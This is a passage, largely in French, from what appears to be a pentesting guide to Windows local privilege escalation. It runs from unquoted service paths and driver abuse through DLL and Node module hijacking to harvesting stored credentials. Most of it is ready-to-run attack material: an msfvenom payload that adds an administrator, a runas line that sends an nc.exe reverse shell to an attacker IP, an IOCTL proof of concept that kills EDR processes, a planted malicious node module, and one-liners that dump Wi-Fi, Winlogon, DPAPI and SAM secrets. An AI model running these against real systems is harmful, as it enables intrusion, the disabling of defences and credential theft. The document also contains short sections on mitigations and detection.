Si le chemin vers un exécutable n'est pas entre guillemets, Windows essaiera d'exécuter chaque fin avant un espace.

Par exemple, pour le chemin _C:\Program Files\Some Folder\Service.exe_, Windows essaiera d'exécuter :
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lister tous les service paths non quotés, en excluant ceux appartenant aux services Windows intégrés :
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Vous pouvez détecter et exploiter** cette vulnérabilité avec metasploit: `exploit/windows/local/trusted\_service\_path` Vous pouvez créer manuellement un binaire de service avec metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows permet aux utilisateurs de spécifier des actions à effectuer si un service échoue. Cette fonctionnalité peut être configurée pour pointer vers un binaire. Si ce binaire est remplaçable, une élévation de privilèges peut être possible. Plus de détails peuvent être trouvés dans la [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Vérifiez les **permissions des binaires** (peut-être pouvez-vous en écraser un et élever les privilèges) et celles des **dossiers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissions d'écriture

Vérifiez si vous pouvez modifier un certain fichier de configuration pour lire un fichier spécial ou si vous pouvez modifier un binaire qui va être exécuté par un compte Administrator (schedtasks).

Une façon de trouver les permissions faibles des dossiers/fichiers dans le système est de faire :
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ charge automatiquement toute DLL de plugin sous ses sous-dossiers `plugins`. Si une installation portable/copy inscriptible est présente, déposer un plugin malveillant donne une exécution de code automatique dans `notepad++.exe` à chaque lancement (y compris depuis `DllMain` et les callbacks du plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Vérifiez si vous pouvez écraser une clé de registre ou un binaire qui va être exécuté par un autre utilisateur.**\
**Lisez** la **page suivante** pour en savoir plus sur les emplacements **autoruns** intéressants pour élever les privilèges :


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Recherchez d'éventuels **drivers tiers étranges/vulnérables**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expose une primitive arbitraire de lecture/écriture kernel (courante dans les handlers IOCTL mal conçus), vous pouvez escalader en volant directement un token SYSTEM depuis la mémoire kernel. Voir la technique pas à pas ici :

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Pour les bugs de race-condition où l’appel vulnérable ouvre un chemin Object Manager contrôlé par l’attaquant, ralentir délibérément la recherche (en utilisant des composants de longueur maximale ou de longues chaînes de répertoires) peut étendre la fenêtre de quelques microsecondes à des dizaines de microsecondes :

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitives de corruption mémoire des hive Registry

Les vulnérabilités modernes de hive vous permettent de groom des layouts déterministes, d’abuser des descendants HKLM/HKU inscriptibles, et de convertir une corruption de métadonnées en débordements de kernel paged-pool sans driver personnalisé. Découvrez la chaîne complète ici :

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusion de type en mode direct de `RtlQueryRegistryValues` à partir de chemins contrôlés par l’attaquant

Certains drivers acceptent un chemin Registry depuis l’espace userland, valident seulement qu’il s’agit d’une chaîne UTF-16 correcte, puis appellent `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` avec `RTL_QUERY_REGISTRY_DIRECT` vers un scalaire de stack comme `int readValue`. Si `RTL_QUERY_REGISTRY_TYPECHECK` est absent, `EntryContext` est interprété selon le **type réel** du Registry, et non selon le type attendu par le développeur.

Cela crée deux primitives utiles :

- **Confused deputy / oracle** : un chemin absolu `\Registry\...` contrôlé par l’utilisateur permet au driver d’interroger des clés choisies par l’attaquant, de divulguer leur existence via les codes de retour/logs, et parfois de lire des valeurs auxquelles l’appelant ne pourrait pas accéder directement.
- **Corruption de mémoire kernel** : une destination scalaire comme `&readValue` devient type-confused en `REG_QWORD`, `UNICODE_STRING` ou buffer binaire dimensionné selon le type de la valeur Registry.

Notes d’exploitation pratiques :

- **Mitigation Windows 8+** : si la requête touche un **untrusted hive** avec `RTL_QUERY_REGISTRY_DIRECT` mais sans `RTL_QUERY_REGISTRY_TYPECHECK`, les appels kernel provoquent `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Pour conserver l’exploitabilité, cherchez des **clés inscriptibles par l’attaquant à l’intérieur de hives système trusted** au lieu de préparer les valeurs sous `HKCU`.
- **Staging sur hive trusted** : utilisez NtObjectManager pour énumérer les descendants inscriptibles de `\Registry\Machine`, puis relancez le scan avec un token **low-integrity** dupliqué pour trouver les clés accessibles depuis des contextes sandboxés :
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`** : une écriture directe de 8 octets dans un `int` de 4 octets corrompt les données adjacentes de la stack et peut écraser partiellement un callback/function pointer proche.
- **`REG_SZ` / `REG_EXPAND_SZ`** : le mode direct attend que `EntryContext` pointe vers une `UNICODE_STRING`. Si le code charge d’abord une valeur `REG_DWORD` contrôlée par l’attaquant dans un scalaire de stack, puis réutilise ce même buffer pour une lecture de chaîne, l’attaquant contrôle `Length`/`MaximumLength` et influence partiellement le pointeur `Buffer`, ce qui donne une écriture kernel semi-contrôlée.
- **`REG_BINARY`** : pour de grandes données binaires, le mode direct traite le premier `LONG` à `EntryContext` comme une taille de buffer signée. Si une lecture `REG_DWORD` précédente laisse une valeur **négative** contrôlée par l’attaquant dans le scalaire réutilisé, la prochaine requête `REG_BINARY` copie les octets de l’attaquant directement au-dessus des slots de stack adjacents, ce qui est souvent la voie la plus propre vers un overwrite complet de callback-pointer.

Motif de hunting fort : **lectures de registre hétérogènes dans la même variable de stack sans la réinitialiser**. Grep pour `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, des pointeurs `EntryContext` réutilisés, et des chemins de code où la première lecture de registre contrôle si une seconde lecture a lieu.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Certains drivers tiers signés créent leur device object avec un SDDL fort via IoCreateDeviceSecure mais oublient de définir FILE_DEVICE_SECURE_OPEN dans DeviceCharacteristics. Sans ce flag, le DACL sécurisé n’est pas appliqué quand le device est ouvert via un chemin contenant un composant supplémentaire, ce qui permet à n’importe quel utilisateur non privilégié d’obtenir un handle en utilisant un namespace path comme :

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Une fois qu’un utilisateur peut ouvrir le device, des IOCTLs privilégiés exposés par le driver peuvent être abusés pour LPE et des modifications. Capacités observées dans la nature :
- Retourner des handles full-access vers des processus arbitraires (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lecture/écriture brute de disque sans restriction (offline tampering, boot-time persistence tricks).
- Terminer des processus arbitraires, y compris Protected Process/Light (PP/PPL), permettant de kill AV/EDR depuis user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations pour les développeurs
- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.

Detection ideas for defenders
- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Pour plus d’informations sur la manière d’abuser de cette vérification :


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

C’est une variante de **Windows uncontrolled search path** qui affecte les applications **Node.js** et **Electron** lorsqu’elles effectuent un import direct comme `require("foo")` et que le module attendu est **absent**.

Node résout les packages en remontant l’arborescence des répertoires et en vérifiant les dossiers `node_modules` dans chaque répertoire parent. Sous Windows, cette remontée peut atteindre la racine du disque, donc une application lancée depuis `C:\Users\Administrator\project\app.js` peut finir par tester :

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **utilisateur avec peu de privilèges** peut créer `C:\node_modules`, il peut déposer un `foo.js` malveillant (ou un dossier de package) et attendre qu’un processus **Node/Electron avec plus de privilèges** tente de résoudre la dépendance manquante. Le payload s’exécute dans le contexte de sécurité du processus victime, ce qui devient donc **LPE** chaque fois que la cible s’exécute en tant qu’administrateur, depuis une tâche planifiée wrapper de service/schéma élevé, ou depuis une application de bureau privilégiée lancée automatiquement.

C’est particulièrement courant lorsque :

- une dépendance est déclarée dans `optionalDependencies`
- une bibliothèque tierce encapsule `require("foo")` dans un `try/catch` et continue en cas d’échec
- un package a été supprimé des builds de production, omis lors du packaging, ou n’a pas réussi à s’installer
- le `require()` vulnérable se trouve profondément dans l’arbre des dépendances plutôt que dans le code principal de l’application

### Hunting des cibles vulnérables

Utilisez **Procmon** pour prouver le chemin de résolution :

- Filtrez par `Process Name` = exécutable cible (`node.exe`, l’EXE de l’application Electron, ou le processus wrapper)
- Filtrez par `Path` `contains` `node_modules`
- Concentrez-vous sur `NAME NOT FOUND` et sur l’ouverture finale réussie sous `C:\node_modules`

Modèles utiles de code review dans des fichiers `.asar` extraits ou dans les sources de l’application :
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifiez le **nom du package manquant** à partir de Procmon ou de l’examen du code source.
2. Créez le répertoire de recherche root s’il n’existe pas déjà :
```powershell
mkdir C:\node_modules
```
3. Déposez un module avec le nom exact attendu :
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Déclenchez l'application victime. Si l'application tente `require("foo")` et que le module légitime est absent, Node peut charger `C:\node_modules\foo.js`.

Des exemples réels de modules optionnels manquants qui correspondent à ce modèle incluent `bluebird` et `utf-8-validate`, mais la **technique** est la partie réutilisable : trouvez n'importe quel **missing bare import** qu'un processus Windows Node/Electron privilégié va résoudre.

### Idées de détection et de durcissement

- Alertez lorsqu'un utilisateur crée `C:\node_modules` ou y écrit de nouveaux fichiers/packages `.js`.
- Recherchez les processus high-integrity qui lisent depuis `C:\node_modules\*`.
- Regroupez toutes les dépendances d'exécution en production et auditez l'utilisation de `optionalDependencies`.
- Examinez le code tiers pour des patterns silencieux `try { require("...") } catch {}`.
- Désactivez les sondes optionnelles lorsque la bibliothèque le permet (par exemple, certains déploiements `ws` peuvent éviter l'ancienne sonde `utf-8-validate` avec `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### fichier hosts

Vérifiez s’il existe d’autres ordinateurs connus codés en dur dans le fichier hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces réseau & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ports ouverts

Vérifiez les **restricted services** depuis l’extérieur
```bash
netstat -ano #Opened ports?
```
### Table de routage
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Table ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Règles du pare-feu

[**Consultez cette page pour les commandes liées au pare-feu**](../basic-cmd-for-pentesters.md#firewall) **(lister les règles, créer des règles, désactiver, désactiver...)**

Plus[ de commandes pour l'énumération réseau ici](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` peut aussi être trouvé dans `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si vous obtenez l'utilisateur root, vous pouvez écouter sur n'importe quel port (la première fois que vous utilisez `nc.exe` pour écouter sur un port, une fenêtre GUI vous demandera si `nc` doit être autorisé par le pare-feu).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Pour démarrer facilement `bash` en tant que root, vous pouvez essayer `--default-user root`

Vous pouvez explorer le système de fichiers `WSL` dans le dossier `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Identifiants Windows

### Identifiants Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Le Windows Vault stocke les identifiants utilisateur pour les serveurs, les sites web et d'autres programmes que **Windows** peut **connecter automatiquement les utilisateurs**. À première vue, cela pourrait laisser penser que les utilisateurs peuvent maintenant stocker leurs identifiants Facebook, Twitter, Gmail, etc., afin qu'ils se connectent automatiquement via les navigateurs. Mais ce n'est pas le cas.

Windows Vault stocke les identifiants que Windows peut utiliser pour connecter automatiquement les utilisateurs, ce qui signifie que toute **application Windows qui a besoin d'identifiants pour accéder à une ressource** (serveur ou site web) **peut utiliser ce Credential Manager** & Windows Vault et utiliser les identifiants fournis au lieu que les utilisateurs saisissent tout le temps le nom d'utilisateur et le mot de passe.

À moins que les applications n'interagissent avec Credential Manager, je ne pense pas qu'il soit possible pour elles d'utiliser les identifiants pour une ressource donnée. Donc, si votre application veut utiliser le vault, elle doit d'une manière ou d'une autre **communiquer avec le credential manager et demander les identifiants pour cette ressource** à partir du vault de stockage par défaut.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ensuite, vous pouvez utiliser `runas` avec l'option `/savecred` afin d'utiliser les identifiants enregistrés. L'exemple suivant appelle un binaire distant via un partage SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utiliser `runas` avec un ensemble d’identifiants fourni.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Notez que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ou depuis [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

L'**API de Protection des Données (DPAPI)** fournit une méthode de chiffrement symétrique des données, principalement utilisée dans le système d'exploitation Windows pour le chiffrement symétrique des clés privées asymétriques. Ce chiffrement exploite un secret utilisateur ou système pour contribuer de manière significative à l'entropie.

**DPAPI permet le chiffrement des clés via une clé symétrique dérivée des secrets de connexion de l'utilisateur**. Dans les scénarios impliquant le chiffrement système, elle utilise les secrets d'authentification du domaine du système.

Les clés RSA utilisateur chiffrées, à l'aide de DPAPI, sont stockées dans le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où `{SID}` représente le [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) de l'utilisateur. **La clé DPAPI, située avec la master key qui protège les clés privées de l'utilisateur dans le même fichier**, se compose généralement de 64 octets de données aléatoires. (Il est important de noter que l'accès à ce répertoire est restreint, empêchant d'en lister le contenu via la commande `dir` dans CMD, bien qu'il puisse être listé via PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Vous pouvez utiliser le **module mimikatz** `dpapi::masterkey` avec les arguments appropriés (`/pvk` ou `/rpc`) pour le déchiffrer.

Les **fichiers d'identifiants protégés par le mot de passe maître** se trouvent généralement dans :
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Vous pouvez utiliser le **module mimikatz** `dpapi::cred` avec le `/masterkey` approprié pour déchiffrer.\
Vous pouvez **extraire de nombreuses DPAPI** **masterkeys** depuis la **mémoire** avec le module `sekurlsa::dpapi` (si vous êtes root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

Les **PowerShell credentials** sont souvent utilisées pour des tâches de **scripting** et d’automatisation comme moyen de stocker facilement des credentials chiffrés. Les credentials sont protégées à l’aide de **DPAPI**, ce qui signifie généralement qu’elles ne peuvent être déchiffrées que par le même utilisateur sur le même ordinateur sur lequel elles ont été créées.

Pour **décrypter** une PS credentials à partir du fichier qui la contient, vous pouvez faire :
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connexions RDP enregistrées

Vous pouvez les trouver dans `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
et dans `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Commandes exécutées récemment
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestionnaire d'identifiants Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilisez le module **Mimikatz** `dpapi::rdg` avec le `/masterkey` approprié pour **décrypter n’importe quels fichiers .rdg**\
Vous pouvez **extraire de nombreuses masterkeys DPAPI** depuis la mémoire avec le module `sekurlsa::dpapi` de Mimikatz

### Sticky Notes

Les gens utilisent souvent l’application StickyNotes sur les postes de travail Windows pour **enregistrer des mots de passe** et d’autres informations, sans se rendre compte que c’est un fichier de base de données. Ce fichier se trouve à `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` et il vaut toujours la peine de le rechercher et de l’examiner.

### AppCmd.exe

**Notez que pour récupérer les mots de passe depuis AppCmd.exe, vous devez être Administrator et exécuter sous un niveau High Integrity.**\
**AppCmd.exe** se trouve dans le répertoire `%systemroot%\system32\inetsrv\`.\
Si ce fichier existe, il est possible que بعض **credentials** aient été configurés et puissent être **recovered**.

Ce code a été extrait de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Vérifiez si `C:\Windows\CCM\SCClient.exe` existe .\
Les installateurs sont **exécutés avec les privilèges SYSTEM**, beaucoup sont vulnérables au **DLL Sideloading (Info de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fichiers et Registre (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Clés d’hôte SSH Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Clés SSH dans le registre

Les clés privées SSH peuvent être stockées dans la clé de registre `HKCU\Software\OpenSSH\Agent\Keys`, donc vous devriez vérifier s’il y a quelque chose d’intéressant dedans :
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si vous trouvez une entrée dans ce chemin, il s’agit probablement d’une clé SSH sauvegardée. Elle est stockée chiffrée mais peut être facilement déchiffrée en utilisant [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Plus d'informations sur cette technique ici : [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si le service `ssh-agent` n’est pas en cours d’exécution et que vous souhaitez qu’il démarre automatiquement au boot, exécutez :
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Il semble que cette technique ne soit plus valide. J'ai essayé de créer quelques clés ssh, de les ajouter avec `ssh-add` et de me connecter via ssh à une machine. Le registre HKCU\Software\OpenSSH\Agent\Keys n'existe pas et procmon n'a pas identifié l'utilisation de `dpapi.dll` pendant l'authentification par clé asymétrique.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Vous pouvez également rechercher ces fichiers avec **metasploit** : _post/windows/gather/enum_unattend_

Exemple de contenu :
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Sauvegardes SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Identifiants Cloud
```bash
#From user home
